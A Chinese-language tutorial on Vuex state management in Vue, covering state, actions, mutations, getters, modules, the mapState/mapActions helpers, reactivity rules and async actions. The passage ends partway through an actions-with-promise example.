### Vuex: 全局单例模式
我们现在要做的就是将共享的状态抽取出来, 交给我们的大管家 统一进行管理 之后 你们每个视图 按照我规定好的规定, 进行访问和修改等操作 比如

我们是通过 ``$store.state.变量`` 访问  

修改 的话也有固定的格式 先往vuex里面进行提交, 提交之后vuex再进行修改 这就是Vuex背后的基本思想

<br>

### 官方推荐的 修改 vuex 中共享变量的流程图:
```js 

                  Actions
      dispatch↗            ↘commit

Vue Components                   Mutations <->Devtools

          render↖          ↙mutate
                   state
```

<br>

### 从上图 Vue Components(组件) 起点开始
组件中可以使用 vuex state 中的变量

但是修改state中的变量的时候 vuex希望我们先分发一个操作到actions 然后由actions提交到mutations

```
页面 -> actions -> mutations
```

<br>

不要在其他的任何地方修改state 要是修改的话只能通过mutations来修改 为什么呢?

<br>

### Devtools: vue开发的浏览器插件

这个插件可以帮我们记录每次修改state的状态 如果绕过了上面的环节 Devtools 就跟踪不到了

因为现在是三个组件共享一个state变量, 那state中的状态的更改可能是来自多个地方的, 如果多个组件都在修改state的话 很难跟踪到哪个组件修改这个状态了

而Devtools可以记录每一次state被修改时的状态 我们就可以跟踪到哪一个组件改错了, 如果绕过了上面的环节 Devtools 就跟踪不到了
  
<br>

### 分发到Actions 和 直接提交到Mutations区别
其实我们也不用先通过Actions再提交到mutations的顺序来修改 

我们可以从 Vue Components 的位置直接提交到 mutations去修改state中的变量

<br>

**区别:**
当有有异步操作不要直接提交到在Mutations中, **Mutations都是同步操作** 如果Mutations中有异步操作 Devtools也跟踪不到

<br>

如果有异步操作的时候要先分发到Actions中, 由Actions提交到Mutations中的就变成同步操作了

<br>

什么情况下会进行异步操作?? **发送网络请求**

<br><br>

## Vuex的基本使用
我们将一个数据放入到Vuex中

<br><br>

### Vuex: state 配置项
**将状态数据配置到 state对象中**   
直接放在 store.js 文件中的 state 对象里面即可
```js 
// 准备state:  存储数据
const state = {
  sum: 0    // 将数据直接放在 state里面
}

// 创建store
const store = new Vuex.Store({
  actions,
  mutations,
  state
})
```

<br><br>

### Vuex: actions 配置项
在组件中 调用 $store.dispatch() 将对应的逻辑交给 actions 对象中的对应函数去处理

actions对象中会预定好处理函数

<br>

### **<font color="#C2185B">this.$store.dispatch(actions中预定义的处理函数, 数据)</font>**  
```js 
add() {
  this.$store.dispatch('add', this.n)
  // 将加的处理逻辑 交给在 actions 对象中配置好的 处理函数中
}
```

<br>

**actions对象:**  
actions对象中定义好函数, 组件内的dispatch会分发到actions中预定于好的函数

组件内的dispatch会指定一个store中的actions对象中的已预定义好的处理函数(和分发的函数名相同) **其目的就是将组件中的事件内的逻辑交给actions中对应的处理函数去处理 而不是组件内部处理**  

```js
// store index.js 中的 actions
const actions = {
  add(context, value) {
    
    // 组件中dispatch指定的处理函数 该函数名必须和dispatch中指定的函数名一致
    context.commit('add', value)
  }
}
```

<br>

**<font color="#C2185B">actions中的函数的参数: context</font>**   
context也有人叫他miniStore 因为里面有一些方法 跟store中一样但没store多 也有人这么理解 它叫做上下文也就是说 往上看看 往下看看 这个函数可能会遇到的所有方法组合成一个对象提供给你调用

比如 commit 方法就封装在context里面 context中有
```js
context: {
  commit: f,
  dispatch: f,
  getters: {},
  state: {},
}
```

<br>

**<font color="#C2185B">value</font>**   
组件中dispatch传递过来的参数

<br>

随后 actions 会将对应的处理逻辑 通过 commit() 提交到 mutations 中

<br>

**也可以理解为:**  
组件 -- 指定了 actions 的对应处理函数 -- mutations 里面也要有对应的处理函数
```
A - A - A
```

<br>

### 扩展:
actions对象中的函数 有commit state还能理解 那为什么要有 dispatch 呢? 

actions函数中的 ``context.dispatch()`` 它用来干什么?   

我们在一个actions函数中 如果处理太多的逻辑 会让整个代码看起来非常的复杂 这时候我们就可以将分函数来处理整个的逻辑 

我们可以在 actions 对象中定义多个 方法 利用dispatch()分发到指定的方法中做对应的逻辑 最后在分发到 mutations 中

```js 
const actions = {
  add(context, value) {
    context.dispatch('demo1', value)
  }

  // 传递逻辑到demo1
  demo1(context, value) {
    context.dispatch('demo2', value)
  }

  // 传递逻辑到demo2 然后demo2做最后的提交
  demo2(context, value) {
    context.commit('add', value)
  }
}
```

<br><br>

### Vuex: mutations 配置项
在store中的 mutations 对象里面 创建 和 actions一样的处理函数

<br>

```js 
const mutations = {
  add(state, value) {
    state.sum += value
  }
}
```

<br>

**mutations中的函数的参数:**  
**<font color="#C2185B">state</font>**   
我们数据存放的地方

<br>

**<font color="#C2185B">value</font>**   
组件传递过来的数据

<br>

**技巧:**  
可以在 mutations 里面定义大写常量级别的函数名 在actions里面commit到这个函数名上  

也就是说actions没起什么作用直接把要做的事情传递到了mutations里面 然后mutations才是真正工作的人 所以它能拿到state中的数据

<br>

### 注意:
我们修改的是 state 当中的某个数据 并不是 state对象
```s
state = data        x
state.msg = data    o
```

<br>

一般来讲 我们在组件内部只写dispatch到actions中的哪个处理函数 也不写太多的逻辑 太多的逻辑可以在actions里面来处理 **主要的逻辑都可以在 actions 里面完成**

```js 
// 组件内部 只负责在什么时候进行dispatch
methods: {
  incrementOdd() {
    if(this.$store.state.num % 2) {
      this.$store.dispatch('incrementOdd', this.n)
    }
  }
}



// actions中负责处理比较复杂的逻辑
actions: {
  incrementOdd(context, value) {
    if(context.state.sum % 2) {
      context.commit('incrementOdd', value)
    }
  }
}
```

<br>

在 mutations 里面不要写过多的逻辑 也不要写异步任务 比如ajax请求 也就是说 整个操作store中的数据的逻辑 

1. 组件中 只写 dispatch指定哪个actions中的处理函数
2. actions中的处理函数 **可以负责写逻辑**
3. mutations中的函数 只写直接怎么操作数据

<br>

### 规范:
一般actions中的函数名小写 mutations里面的函数名大写 这样的好处是**在开发者工具中能够直观的看到**

actions看似没有用处 但是当业务逻辑一复杂 我们在actions里面定义逻辑 这里面的逻辑只有一套 很多组件公用这一套

**如果复杂的逻辑放在组件自身 不方便复用**

<br>

### mutations 的案例:
之前我们在页面上修改vuex中的变量都是 +1 -1 我现在希望 +5 +10 也就是组件要告诉mutations怎么修改 修改多少
```js 
// 组件中 标签内部绑定事件, 并传入实参
<button @click='addCount(5)'>按钮3</button>

// 直接提交到 mutations 中
addCount(count) {
  this.$store.commit('incrementCount', count);
}

// vuex中 mutations 对象中
incrementCount(state, count) {
  state.counter += count
}
```

<br>

### **<font color='#C2185B'>this.$store.commit('事件类型', 数据)</font>**

**参数形式: 分两个参数写**  
```js 
// payload就是数据
this.$store.commit('事件类型', payload)
```

<br>

**参数形式: 对象形式**  
```js
this.$store.commit({
  type: "mutations中设置的方法名",
  payload: 数据
})
```

<br><br>

### Vuex: getters 配置项
这个配置项都没有出现在vuex的原理图里 就说明它不是一个必须的配置项  

当state中的数据 组件在使用的时候并不是直接拿来用 而是state中的数据乘10加100后 组件里在使用 也就是说这个数据要经过很多逻辑的运算之后的结果

<br>

**那在哪完成比较好?**   
- 组件?  组件内完成之后该组件能使用 不适合复用  
- vuex? 对在vuex里面完成其它组件可以直接拿到 复杂逻辑后的数据 方便复用

<br>

### getters 作用:
getters配置项主要用来对state中的数据进行加工 方便组件调用加工后的数据起到复用的效果 **像极了 data 和 computed 的关系**

<br>

### 页面使用 getters 中的数据:
```js
$store.getters.变量
```

<br>

### getters的使用
跟 计算属性 一样定义一个变量 把这个变量写成函数 然后直接使用 函数名 它就是属性名 getters配置项的类型是一个对象

```js
const gettes = {
  属性名(state, getters) {
    return 值
  }
}
```

<br>

**参数:**  
- state: state对象
- getters: 用于调用getters对象中其它"计算属性"

<br>

**返回值:**  
返回值作为"计算属性"的值

<br>

```js 
const state = {
  msg: "我是store中的数据: hello, vuex"
}

// 用于将state中的数据进行加工
const getters = {
  process(state, getters) {
    // 在 msg 的后面  + !
    return state.msg + "!"
  }
}

  
// 页面中的使用
<div>store:  {{$store.state.msg}}</div>
// 这里就是计算属性的用法 写的是 方法名
<div>getter: {{$store.getters.process}}</div>
```

<br>

### getters的案例1:
将vuex中的共享属性 students 展示到组件中, 要求展示年龄大于20岁的

<br>

**方式1: 组件内使用 计算属性**  
我们可以在组件中定义计算属性, 然后做完处理后展示在组件的模板中, 但是有个问题, 当我其它的页面都需要展示这个结果, 同样的代码还要继续再写一遍

```js 
// store 
state: {
  counter:1000,
  students: [
    {id:1, name:'sam', age:28},
    {id:2, name:'erin', age:18},
    {id:3, name:'nn', age:8}
  ]
}


// 组件 在组件中我们使用了 计算属性 来达成目的
computed: {
  clac() {
    return this.$store.state.students.filter(item => {
      return item.age >= 18;
    })
  }
}
```

<br>

**方式2: 使用getters**  
所以我们可以在getters中处理好等其它组件来调用
```js 
// store index.js
getters: {
  calc(state) {
    return state.students.filter(item => item.age > 10);
  }
}

// 组件调用
<p>{{$store.getters.calc[0].name}}</p>
```

<br>

获取 vuex state 中的 students中的年龄大于10的学生 和 个数

```js 
<p>{{$store.getters.calc}}</p>

// 这样就能拿到个数了
<p>{{$store.getters.calc.length}}</p>
```

<br>

**那如何将个数的需求 定义成一个getters中的方法呢?**  
比如通过这样的方式获得 ``<p>{{$store.getters.calcLength}}</p>``

```js 
// 我们可以这样
getters: {
  powerCounter(state) {
    return state.counter * state.counter;
  },

  calc(state) {
    return state.students.filter(item => item.age > 10);
  },

  // 定义一个新的方法
  calcLength(state) {
    return state.students.filter(item => item.age > 10).length;
  }
}

// 上面的代码中都有return state.students.filter(item => item.age > 10)这么

// 在 getters 对象中的方法中, 还有第二个参数 getters 就代表了 getters对象 所以我们还可以这么写
getters: {
  powerCounter(state) {
    return state.counter * state.counter;
  },

  calc(state) {
    return state.students.filter(item => item.age > 10);
  },


  // 通过getters拿到calc属性 得到它的length
  calcLength(state, getters) {
    return getters.calc.length;
  }
}
```

<br>

### 技巧: getters接收参数 (inner函数接收外部参数)
我希望得到 state中students 年龄大于 age 的 这个age是别人在用getters的时候传递进来的
```js 
getters: {
  calc(state) {
    return state.students.filter(item => item.age > 10);
  }
}

// 上面的 item.age > 10 是写死的 我希望别人在使用的时候 传递一个age过来做判断
<p>{{$store.getters.calc(10)}}</p>


// 但是 getters 中的方法的参数 只有固定的state getters 不接受传递其它的参数 我们里面传递(state, getters, age) 这种方式不行
calc(state) {
    return state.students.filter(item => item.age > 10);
  }



// 那怎么解决 我们返回一个函数
test(state) {
  return function(age) {     // 我们在这里传递age形参
    return state.students.filter(item => item.age > age)
  }
}

// 因为 getters 的test属性 我们返回的是一个函数 函数可以加小括号调用 那么就可以传递参数
<p>{{$store.getters.test(10)}}</p>

// 实际例子中
<p>{{$store.getters.calc(20)}}</p>
<p>{{$store.getters.calc(20)[0].name}}</p>
```

<br>

### Vuex: modules 配置项
vuex的模块化编码

<br>

在上面的案例中 我们将state actions mutations getters都写在了一个indexjs文件里面 当每一个功能块中的逻辑越来越多的时候就不好管理了

我们的目标是 actions mutations 中的逻辑我们按照不同分类的将它们整理好

```js 
// 求和功能相关的配置
const countOptions = {
  actions: {},
  mutations: {},
  getters: {}
}

// 人员管理功能相关的配置
const personsOptions = {
  actions: {},
  mutations: {},
  getters: {}
}
```

<br>

上面完全形成了两套配置 也就是说写求和相关的程序员动第一套配置 写人员管理的程员动第二套配置

那 ``new Vuex.Store({ ... })`` 怎么写呢? 

<br>

**当我们要使用 多套 配置的情况下 就要使用 modules 模块配置项**

<br>

### 配置项: modules 
它的类型是一个对象 代码可以选择多组配置 使用该配置项后 store 中的配置开始按照我们的配置项分类了

```js
const modules = {
  模块名: 一组配置
}

new Vuex.Store({
  modules
})
```

<br>

**注意:**  
在使用modules的时候 我们上面定义的 **每一组配置对象里面必须要加上** 一个如下属性 便于 mapState 系列的方法识别

```js
const 一组配置 = {
  namespaced: true  // 开启命名空间 
  actions: {},
  mutations: {},
  getters: {}
}
```

<br>

**示例:**  
```js 
// 求和功能相关的配置
const countOptions = {
  namespaced: true  // 这里
  actions: {},
  mutations: {},
  getters: {}
}

// 人员管理功能相关的配置
const personsOptions = {
  namespaced: true  // 这里
  actions: {},
  mutations: {},
  getters: {}
}


new Vuex.Store({
  // 模块a 和 模块b
  modules: {
    a: countOptions,
    b: personsOptions
  }
})



// 它就像将store里面分成了两个配置
store: {
  a: {
    actions,
    mutations,
    state
  },

  b: {
    actions,
    mutations,
    state
  }
}
```

换句话说我们每一个 actions mutations 里面都分为了 a配置 和 b配置

<br>

### 扩展: A模块的 actions中 还可以分发到 B模板的 actions 中

<br>

### 模块化后: 模版中的使用方式

**1. state的使用方式**  
```js
$store.state.模块名.数据
```

```html
<div>
  info/msg: {{$store.state.info.msg}}
</div>
<div>
  count/count: {{$store.state.count.count}}
</div>
```

<br>

**2. getters的使用方式:**   
getters中的数据结构为
```js 
getters: {
  a/sum: 0,
  b/name: '张三'
}
```

```js
$store.getters["模块名/变量"]
```

<br>

**3. dispatch的使用方式:**  
```js
dispatch("模块名/指定方法")

methods: {
  modify() {
    this.$store.dispatch("info/modify", "我是修改后的数据哦")
  }
}
```

<br>

**完整代码:**
```js
// store.js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

// 输出信息的 store
const infoOptions = {
  namespaced: true,
  state: {
    msg: "我是info模块中的数据哦"
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  }
}

// 数字累加的 store
const countOptions = {
  namespaced: true,
  state: {
    count: 1
  },
  actions: {
    add({commit}, data) {
      commit("add", data)
    }
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  }
}

export default new Vuex.Store({
  modules: {
    count: countOptions,
    info: infoOptions
  }
})

// 组件内部代码
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      info/msg: {{$store.state.info.msg}}
    </div>
    <div>
      count/count: {{$store.state.count.count}}
    </div>
    <hr>
    <button @click="add">add</button>
    <button @click="modify">modify</button>
  </div>
</template>

<script>
import {mapState, mapGetters, mapMutations, mapActions} from "vuex"
export default {
  mounted() {
    console.log(this.$store)
  },
  methods: {
    modify() {
      this.$store.dispatch("info/modify", "我是修改后的数据哦")
    },
    add() {
      this.$store.dispatch("count/add", 1)
    }
  }
}
</script>
```

<br><br>

# map系列: 
我们使用 store 的数据 如果要在模板中使用前面都要加上 
```js
$store.state.sum
```

<br>

当模板中要很多地方都要使用vuex中的数据的话 那可能就会写很多的重复的代码 
```js
$store.state.xxx
```

那有没有什么办法能够帮我们解决写$store.state这部分的代码呢? vuex中给我们提供了很多类似的 创建模板代码的函数

<br>

## mapState():
帮助我们在模板中使用vuex中的数据的时候 可以不用再写 ``$store.state`` 的功能

```js 
// 一长串的代码可以简写成 sum
$store.state.sum   -->   sum
```

<br>

### mapState的使用方式:
用于帮助我们映射state中的数据为计算属性

<br>

**引入:**  
```js
import {mapState} from 'vuex'
```

<br>

**使用位置: computed中**  
在 computed 中使用 ``...mapState(参数)`` 函数
```js
computed: {
  ...mapState(参数)
}
```

<br>

### **<font color='#C2185B'>...mapState(参数)</font>**
mapState() 生成的结果是一个对象类型

其实我们也可以自己使用computed来完成这个逻辑 只是这样做很麻烦 vuex 给我们提供了方法 然后我们在模板中是不是可以直接使用 sum 了
```js 
  // 自己使用计算属性完成
computed: {
  sum() {
    return this.$store.state.sum
  }
}
```

<br>

**参数方式1: 对象写法**  
```js
computed: {
  ...mapState({
    // value的部分要加上引号
    组件中想要使用的变量名: 'state中指定的数据的 key',    
  })
}



// 扩展 Value部分还可以是一个函数
computed: {
  ...mapState({
    // value的部分要加上引号
    组件中想要使用的变量名: state => state.它内部的数据,    
  })
}
```

<br>

**注意:**  
1. mapState中的 key value 不能因为我们想起的名字和state中的数据名一致 就使用es6的简写模式

2. 当 v 使用函数的写法的时候 就是通过 state 去读vuex中我们想要使用的数据

3. 脚本里面想要使用 数据的时候 我们还是要通过 this.计算属性 的方式

<br>

**要点:**  
mapState()的返回值是一个对象 放在计算属性中的时候 要使用...来解构

使用这个方式本质也是利用了计算属性 但是优点就是mapState vue开发者工具能够观察到 是state中的数据

<br>

**示例:**
```html
<div>mapState: {{msg}}</div>
```

```js
state: {
  school: "尚硅谷"
},

computed: {

  ...mapState({
    // 函数的方式 和 字符串的方式 相同
    school: state => state.school
    school: 'school',
  })
}

mounted() {
  // 其它位置还是要使用 this
  console.log(this.msg)
}
```

<br>

**参数方式1: 数组写法**  
当我们想使用的变量名 和 store 中保存数据的**变量名一致**的时候 我们可以使用数组的写法
```js 
computed: {
  ...mapState(["num"])
}
```

<br>

### mapGetters的使用方式:
用于帮助我们映射getters中的数据为计算属性

<br>

**引入:**  
```js
import {mapGetters} from 'vuex'
```

<br>

**使用位置: computed中**  
在 computed 中使用 ``...mapGetters(参数)`` 函数
```js
computed: {
  ...mapGetters(参数)
}
```

<br>

### **<font color='#C2185B'>...mapGetters(参数)</font>**  
它的参数和 mapState 一致 分为 数组 和 对象 两种形式

```js
import {mapGetters} from "vuex"

computed: {
  ...mapGetters(["process"])
  ...mapGetters({process: "process"})
}

<div>mapGetters: {{process}}</div>
```

<br>

### mapActions mapMutations 的使用方式:
我们在使用 commit() 向 mutations 中提交的时候 都会在组件中对应的处理函数里写提交到Mutations的逻辑

```js  
methods: {
  // 事件回调
  inc() {
    // 提交到mutations中的逻辑
    this.$store.commit('add', this.n)
  }
}
```

我们也可以通过 mapMutations 帮助我们省略 this.$store.commit 的代码 向 Mutations 中提交

<br>

**引入:**  
```js
import {mapActions, mapMutations} from 'vuex'
```

<br>

**使用位置: methods中**  
```js
methods: {
  ...mapActions([] | {})
}
```

<br>

**使用方式:**  
1. 模版中指明按钮之类的回调, 该modify回调并不用在methods中声明
```html
<button @click="modify('数据')">
  click
</button>
```

2. methods配置项中使用 ``...mapActions(["modify"])`` 相当于我们在methods中定义了modify回调

3. 传参的问题是通过 模版中的 ``@click="modify('数据')"`` 传递

<br>

### **<font color='#C2185B'>...mapActions(参数)</font>**  
它的参数 分为 数组 和 对象 两种形式

<br>

**参数形式1: 数组**  
当模块中事件的回调 和 actions 和 mutations 中的方法名一致时可以使用

```s
组件内事件的回调名 = actions中的方法名 = mutations中的方法名

modify = modify = modify
```

```js
methods: {
  ...mapActions(["方法名"])
}
```

<br>

**示例:**  
```html
<!-- 组件内 -->
<button @click="modify('数据')">
  click
</button>

<script>
// vuex内
mutations: {
  modify(state, data) {
    state.msg = data
  }
},
actions: {
  modify({commit}, data) {
    commit("modify", data)
  }
}


// 组件methods内
// 都是 modify 的情况下使用 数组的方式
methods: {
  ...mapActions(["modify"])
},
</script>
```

<br>

**参数形式2: 对象**  
本质上和数组并没有太大的区别, 只不过我们在模版中可以起一个更加符合操作的方法名
```html
<v-btn @click="handler(num)">click</v-btn>
```

```js
methods: {
  ...mapActions({
    模版中的回调名: "actions中预定义方法名"
  })
}
```

<br>

**示例:**

```html
<v-btn @click="handler(num)">click</v-btn>

<script>
  methods: {
    ...mapActions({
      handler: "add"
    })


    // 本质:
    handler(num) {
      this.$store.dispatch("add", num)
    }
  }
</script>


<!-- store -->
<script>
  mutations: {
    add(state, data) {
      state.count += data
    }
  },
  actions: {
    add(context, data) {
      context.commit("add", data)
    }
  },
</script>
```


<br><br>

# map系列: 模块化后

### ...mapState()的使用方式:
### **<font color="#C2185B">...mapState(["模块名1", "模块名2"])</font>**    
相当于解构出 模块, 然后模版中通过 ``模块.变量`` 的形式调用数据
```js
computed: {
  ...mapState(["info", "count"])
}
```

```html
<div>
  info/msg: {{info.msg}}
</div>
<div>
  count/count: {{count.count}}
</div>
```

<br>

### **<font color="#C2185B">...mapState("模块名", ['变量名'])</font>**  
当我们要映射的 变量名 和 store 中的数据一致 的时候可以这么使用
```js
...mapState("info", ['msg'])

// 页面中直接使用 msg 变量名 不需要 模块.变量名
<div>
  info/msg: {{msg}}
</div>
```

<br>

### **<font color="#C2185B">...mapState("模块名", {模版中要使用的变量名: store中的变量名})</font>**  

需要另起变量名的时候使用对象模式
```js
// 模块中
const countOps = {
  namespaced: true,
  state: {
    count: 1
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  },
  actions: {
    add(context, data) {
      context.commit("add", data)
    }
  },
}
```

```html
<!-- 组件中: num是我们想要使用的变量名 -->
<div>{{ num }}</div>

<script>
  computed: {
    // num: 模版中想要使用的名字
    // count: 模块中state的变量名
    ...mapState("countModule", {"num": "count"})
  },
</script>
```

<br>

### ...mapActions()的使用方式:
### **<font color="#C2185B">...mapActions("模块名", ["方法名"])</font>**  
在 methods 配置项中使用

当 组件中 事件回调 & actions & mutations 中的方法名一致的时候可以使用数组方法

下面的使用方式 我们能发现 下面3个都是 add()
```js
<button @click="add(1)">

actions: {
  add() { ... }
},
mutations: {
  add() { ... }
}
```

```html
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <div>
      info/msg: {{msg}}
    </div>
    <div>
      count/count: {{count}}
    </div>
    <hr>
    <button @click="add(1)">add</button>
    <button @click="modify('修改后的数据')">modify</button>
  </div>
</template>

<script>
import {mapState, mapGetters, mapMutations, mapActions} from "vuex"
export default {
  computed: {
    ...mapState("info", ['msg']),
    ...mapState("count", ["count"])
  },
  methods: {
    ...mapActions("count", ["add"]),
    ...mapActions("info", ["modify"]),
  }
}
</script>


<script>
// store.js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

// 输出信息的 store
const infoOptions = {
  namespaced: true,
  state: {
    msg: "我是info模块中的数据哦"
  },
  actions: {
    modify({commit}, data) {
      commit("modify", data)
    }
  },
  mutations: {
    modify(state, data) {
      state.msg = data
    }
  }
}

// 数字累加的 store
const countOptions = {
  namespaced: true,
  state: {
    count: 1
  },
  actions: {
    add({commit}, data) {
      commit("add", data)
    }
  },
  mutations: {
    add(state, data) {
      state.count += data
    }
  }
}

export default new Vuex.Store({
  modules: {
    count: countOptions,
    info: infoOptions
  }
})

</>
```

<br>

### **<font color="#C2185B">...mapActions("模块名", {组件内回调: "actions中的方法名"})</font>**  
在 methods 配置项中使用

当组件内部回调的方法名 和 actions 定义的方法名不一致的时候 我们使用对象的形式


当我们进行模块化编码的时候 我们有两套配置

那么我们在进行 dispatch 和 commit 的时候就要让vuex知道我们是往哪个配置中对应的函数中分发和处理 还是一一对应的关系 所以我们也要先指定具体的配置

<br>

### ...mapGetters()的使用方式:

### **<font color="#C2185B">...mapGetters("模块名", ["getters中的属性名"])</font>**  
```js
<h3>{{listLen}}</h3>

computed: {
  ...mapGetters("goods", ["listLen"])
},
```

<br><br>

# Vuex扩展: state单一状态树的理解

### 单一状态树的概念:
Vuex提出使用单一状态树, 什么是单一状态树?

英文名字 Single Source of Truth, 也可以翻译成单一数据源

我们用一个生活中的例子做一个简单的类比 在国内我们有很多的信息需要被记录, 比如上学时的个人档案, 工作后的社保记录, 公积金记录, 结婚后的婚姻信息, 以及其他相关的户口 医疗 文凭 房产记录等

这些信息被分散在很多地方进行管理, 有一天你需要办理某个业务时(比如入户某个城市) 你会发现你需要到各个对应的工作地点去打印 盖章各种资料信息, 最后到一个地方提交证明你的信息无误

这种保存信息的方案, 不仅仅低效, 而且不方便管理, 以及日后的维护也是一个庞大的工作(需要大量的各个部门的人力来维护, 当然国家目前已经在完善我们的这个系统了)


上面的比喻和我们在应用开发中比较类似

如果你的状态信息是保存到多个store对象中的, 那么之后的管理和维护等等都会变得特别的困难 所以vuex也使用了单一状态树来管理应用层级的全部状态 单一状态树能够让我们最直接的方式找到某个状态的片段, 而且在之后的维护和调试过程中, 也可以非常的方便和管理和维护

```js 
// 上面的意思是, 我们在之前的代码中 只是创建了一个store
const store = new Vuex.Store({})

// 其实还可以跟上面说的情况一样 我可以创建多个
const store1 = new Vuex.Store({})
const store2 = new Vuex.Store({})
const store3 = new Vuex.Store({})

// 但是vue不推荐我们这么做, 而是将所有的状态管理信息放在一个store里面 只要是用到store中东西, 只需要store中的东西 都跟这一个store要就可以 
```

<br><br>

# Vuex扩展: mutation - 数据的响应式原理
也可以说mutation的响应规则

vuex的store中的state是响应式的, 只要是写在state中的属性, 都会被假如响应式的系统里面, 当state的数据发生改变时, vue组件会自动更新

```js 
state: {
  info: {
    name: 'sam',
    age: 18
  }
}
```

我们在vuex的仓库中定义了一个info, 这个info就是响应式的, 假如组件中通过mutations修改了info中的属性的时候, 其它使用了$store.state.info的属性也会跟着发生改变, 这个改变的原理是

info中的每一个属性都对应dep, dep是一个观察的模式 会监听属性的变化 观察数据有没有变化, 一旦发生变化 它会看下有哪些地方是需要根据我们的数据变化去刷新界面的

比如有两个组件引用了info, 那么dep就是一个数组, 数组中 [watcher, watcher]
  
当info中的数据发生变化的情况下, 就会通知数组中的组件让它们也发生对应的变化

```js
info: {
  name: 'sam',    Dep -> watcher
  age: 18         Dep -> watcher
}
```

但是这个响应式是有一定的要求的 要求我们必须遵守一些vuex对应的规则

<br>

### state中的数据是响应式的前提
1. 提前在store中初始化好所需的属性
```js 
  // 比如 我们现在在state对象中定义了info
  state: {
    info: {
      name: 'sam',
      age: 18
    }
  }

  /*
    那么上面的info中的name age都是响应式的, 因为初始化的时候这个info就被添加到响应式的系统中

    但是 如果我们通过 mutations updateInfo往info中新添加了一个属性, 虽然info中是添加了一个属性, 但通过这种方式添加的属性, 并不会被加入响应式的系统时, 组件中不会实时更新address
  */
  
  mutations: {
    updateInfo(state) {
      state.info['adress'] = '洛杉矶'
    }
  }

  // 但是有时候我们确定有这种需求, 期望我们新添加进去的属性, 是响应式的可以界面跟着一起刷新
```


2. 当给state中的对象添加新的属性的时候, 使用下面的方式 新添加的属性就会是响应式的 也就是说 我们使用常规的添加和删除的方式给state对象中添加属性 或者 删除属性并不是响应式的
```js 
  // 常规方法: 下面的常规方法 做不到响应式

  // 添加
  updateInfo(state) {
    state.info['adress'] = '洛杉矶'
  }

  // 删除
  updateInfo(state) {
    delete state.info.age
  }
```

<br>

### 注意: 往state中添加数据的时候 要使用 Vue提供的API
**添加:**   
```js
Vue.set(要修改的对象, '属性名', 属性值)
```

<br>

**删除:**   
```js 
Vue.delete(要删除的对象, '属性名')
```

<br>

**用新对象给旧对象重新赋值:**
```js 
// 方式1
mutations: {
  updateInfo(state) {
    Vue.set(state.info, 'address', '洛杉矶')
    Vue.delete(state.info, 'age')
  }
}
```

<br><br>

# Vuex扩展: Mutations 常量类型
我们来考虑一下下面的问题

在mutation中 我们定义了很多事件类型(也就是其中的方法名称) 当我们的项目增大时, vuex管理的状态越来越多, 需要更新状态的情况越来越多, 那么意味着mutation中的方法就越来越多 方法过多, 使用者需要花费大量的精力去记住这些方法, 甚至是多个文件间的来回切换, 查看方法名称 甚至如果不是复制的时候, 可能还会出现写错的情况 

```js
// vuex 
mutations: {
  updateInfo(state) {
    Vue.set(state.info, 'address', '洛杉矶')
  }
}

// 组件中的方法
this.$store.commit('updateInfo')
```

我们要更改vuex中的状态, 就要通过mutations来进行处理, 但是当我们的项目越来越大mutations中的方法就会越来越多, 不仅需要去记mutations中的事件类型, 还要复制事件类型到组件的commit()中, 这个过程极有可能会出错

vuex建议我们把 mutations中的方法名 放在一个专门放常量的文件中进行管理 这样 mutations 中的方法名 和 组件中的commit都使用一个减小出错的概率

<br>

### 具体步骤:
1. 在store文件夹中, 创建一个mutations-type.js文件
```js
export const INCREMENT = 'increment'
```

2. 分别在store文件夹里面的index.js中, 组件中分别引入并使用该常量
```js
[事件类型]() { ... }
```

```js 
// 组件
import { INCREMENT } = from './路径'
this.$store.commit(INCREMENT)


// vuex
import { INCREMENT } = from './路径'
[INCREMENT](state) {
  Vue.set(state.info, 'address', '洛杉矶')
}
```

<br><br>

# Vuex扩展: actions使用详解:

### Mutations 同步函数:
通常情况下, vuex要求我们mutations中的方法必须是同步方法  
主要的原因是我们使用devtools时, devtools可以帮助我们捕捉mutation的快照

但是如果是异步操作, 那么devtools将不能很好的追踪这个操作什么时候会被完成

```js 
mutations: {
  updateInfo(state) {

    // 同步的话, devtools 能很好的捕捉到快照
    Vue.set(state.info, 'address', '洛杉矶')


    // 在mutations中使用异步的时候 devtools 不能捕捉到快照
    setTimeout(() => {
      Vue.set(state.info, 'address', '洛杉矶')
    }, 1000)
  }
}
```

如果是调试程序的时候 视图确实已经被修改, 但是devtools还是之前的值 不起效果了 devtools跟踪不到 相当于里面记录错误的信息

如果确实需要在vuex中进行一些异步操作, 比如网络请求 那么我们就添加一个环节, 那我们就在actions中定义一个方法 方法内部写上异步操作, 然后由actions提交到mutations, 由mutations来进行修改, 当然组件中也是由使用commit提交到mutations改为使用dispatch提交到actions

<br>

### actions:
actions 里面也是一些的方法  

actions 中的方法的默认形参是 context(上下文)

这里我们把 形参 context 理解为 store 对象 (const store = new Vuex.Store())

既然context是store对象, 那么store中就会有commit方法, 用户将actions中的操作提交到mutations进行修改

<br>

### 完整的步骤:
**1. 在组件中异步修改vuex store中的状态变量**   
使用 $store.dispatch 将点击操作 提交到 actions 中处理
```js 
<button @click='updateInfo'>点击按钮修改信息</button>

updateInfo() {
  this.$store.dispatch('aUpdateInfo');
}
```

<br>

**2. 在action中定义异步操作**  
最终提交到mutations中进行处理  

actions中的方法的参数 是context 可以理解为 store对象 使用context.commit() 提交到mutations中的处理函数
```js 
actions: {
  aUpdateInfo(context) {
    setTimeout(() => {
      context.commit('updateInfo')
    }, 1000)
  }
}
```

<br>

**3. 最终在mutation中修改vuex管理的状态变量**
```js 
mutations: {
  updateInfo(state) {
    state.info.name = 'nn'
  }
}
```

<br>

# Vuex扩展: actions + promise:
我希望当action中修改成功后能够通知组件修改完成 什么时候修改成功呢? 

actions中使用 context.commit 的时候就是成功了, 所在在context.commit()的下面继续写代码就可以了 如果失败就不会执行到 commit下面的代码  

我们可以在组件的 dispatch() 的第二个参数组织成一个对象

```js 
  // 组件
  updateInfo() {

      // 我们将第二个参数整理成对象 里面放参数 和 回调
      this.$store.dispatch('aUpdateInfo', {
        message: '我是参数',
        success: () => {
          console.log('里面已经完成了')
        }
      });
    }


  // actions
